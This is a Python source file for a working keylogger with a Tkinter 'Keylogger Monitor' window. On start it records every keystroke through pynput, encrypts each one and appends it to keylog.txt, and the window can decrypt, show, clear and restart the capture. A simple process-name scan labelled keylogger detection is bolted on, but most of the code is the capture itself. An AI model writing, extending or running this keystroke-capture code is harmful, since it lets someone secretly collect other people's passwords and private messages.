import os
import logging
import tkinter as tk
from tkinter import scrolledtext, messagebox
from cryptography.fernet import Fernet
from pynput import keyboard
import psutil

# Generate or load encryption key
KEY_FILE = "key.key"
LOG_FILE = "keylog.txt"

if not os.path.exists(KEY_FILE):
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as keyfile:
        keyfile.write(key)
else:
    with open(KEY_FILE, "rb") as keyfile:
        key = keyfile.read()

cipher = Fernet(key)

# Setup logger
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(message)s")

def encrypt_log(text):
    """Encrypt log data."""
    return cipher.encrypt(text.encode())

def decrypt_log(text):
    """Decrypt log data."""
    return cipher.decrypt(text).decode()

# Keylogger function
def on_press(key):
    try:
        key_text = key.char if hasattr(key, 'char') and key.char is not None else str(key)
        encrypted_text = encrypt_log(key_text + "\n")
        with open(LOG_FILE, "ab") as f:
            f.write(encrypted_text + b"\n")
    except Exception as e:
        print(f"Error logging key: {e}")

# Keylogger detection
def detect_keyloggers():
    keylogger_names = ["keylogger", "hook", "record"]
    suspicious_processes = []
    for process in psutil.process_iter(["pid", "name"]):
        if any(keyword in process.info["name"].lower() for keyword in keylogger_names):
            suspicious_processes.append(process.info)
    return suspicious_processes

# GUI to display logs
class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger Monitor")
        self.root.geometry("550x450")
        self.root.configure(bg="#2E4053")  # Dark background

        self.title_label = tk.Label(root, text="Keylogger Monitor", font=("Arial", 16, "bold"), bg="#2E4053", fg="white")
        self.title_label.pack(pady=10)

        self.text_area = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=65, height=15, bg="#F8F9F9", fg="black")
        self.text_area.pack(pady=10)

        # Buttons Frame
        button_frame = tk.Frame(root, bg="#2E4053")
        button_frame.pack(pady=10)

        self.load_button = tk.Button(button_frame, text="Load Logs", command=self.load_logs, bg="#3498DB", fg="white", font=("Arial", 10, "bold"), width=15)
        self.load_button.grid(row=0, column=0, padx=5, pady=5)

        self.clear_button = tk.Button(button_frame, text="Clear Logs", command=self.clear_logs, bg="#E74C3C", fg="white", font=("Arial", 10, "bold"), width=15)
        self.clear_button.grid(row=0, column=1, padx=5, pady=5)

        self.detect_button = tk.Button(button_frame, text="Detect Keyloggers", command=self.detect_keyloggers, bg="#27AE60", fg="white", font=("Arial", 10, "bold"), width=15)
        self.detect_button.grid(row=0, column=2, padx=5, pady=5)

    def load_logs(self):
        """Load and decrypt logs"""
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "rb") as f:
                lines = f.readlines()
                decrypted_logs = "".join(decrypt_log(line.strip()) for line in lines)
                self.text_area.delete(1.0, tk.END)
                self.text_area.insert(tk.END, decrypted_logs)
        else:
            self.text_area.insert(tk.END, "No logs found.")

    def clear_logs(self):
        """Stop keylogger, close log file, clear logs, and restart keylogger"""
        global listener  # Access the listener instance

        try:
            listener.stop()  # Stop the keylogger before deleting logs

            # Explicitly close the file before deletion
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, "w") as f:
                    f.truncate(0)  # Clear file content instead of deleting

                self.text_area.delete(1.0, tk.END)
                messagebox.showinfo("Success", "Logs cleared successfully!")

            # Restart the keylogger after clearing logs
            listener = keyboard.Listener(on_press=on_press)
            listener.start()

        except Exception as e:
            messagebox.showerror("Error", f"Failed to clear logs: {e}")

    def detect_keyloggers(self):
        """Detect potential keyloggers running on the system."""
        detections = detect_keyloggers()
        if detections:
            result = "\n".join([f"PID: {proc['pid']}, Name: {proc['name']}" for proc in detections])
            messagebox.showwarning("Alert", f"Suspicious Keyloggers Detected:\n{result}")
        else:
            messagebox.showinfo("Safe", "No suspicious keyloggers detected.")

# Start keylogger listener
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Run GUI
if __name__ == "__main__":
    root = tk.Tk()
    gui = KeyloggerGUI(root)
    root.mainloop()
